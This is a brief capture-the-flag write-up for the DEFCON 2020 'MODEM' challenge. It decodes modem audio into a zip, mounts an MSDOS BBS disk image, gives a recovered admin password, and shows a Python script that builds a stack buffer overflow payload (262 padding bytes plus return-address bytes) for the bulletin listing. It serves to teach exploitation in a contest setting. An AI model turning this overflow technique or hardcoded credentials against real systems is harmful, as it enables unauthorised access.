# MODEM - Pwn - Reversing

After a long time, I'm back for DEFCON 2020 :) 

Use the script `downloader.py` to interact with the server and download the zip. 

Decode the zip with 

Shell1:
```bash
minimodem --rx 1200 -8 -R 48000 -q > data_in_decoded
```

Shell2: 
```bash
cat data_in.dat | aplay -r 48000 -t raw -f FLOAT_LE
```

Finally, decode it with: 
```python
f = open("/tmp/data_in_decoded", "r").read()
splitted = f.split(" ")
decoded = ''.join(map(lambda x: chr(int(x, 16)), splitted))
f = open("myServer.zip", 'wb')
f.write(decoded)
f.close()
```

Extract the zip, mount the image with 

```bash
sudo mount -o loop BBS.IMG /mnt/
```

Reverse the MSDOS binary to extract the admin password `supersneaky2020`. 

Create a new bulletin using the admin panel. There is an overflow when the bulletins are listed: the size of the payload is expected to be 256 bytes long, and after 262 bytes we can overwrite the return address of the function. 

The exploit is the following 

```python
with open('payload.txt', "wb") as f:
    f.write("FLAG.TXT\n")
    f.write("supersneaky2020\n")
    f.write("C\r\n")
    f.write("A" * 262 + "\x7d\xea" + "\x20\x1c" + "\xd5\x0b" + "\n\n")
    f.write("L\n")
```

Use some pro bash commands to interact with the server, see the video below :) 


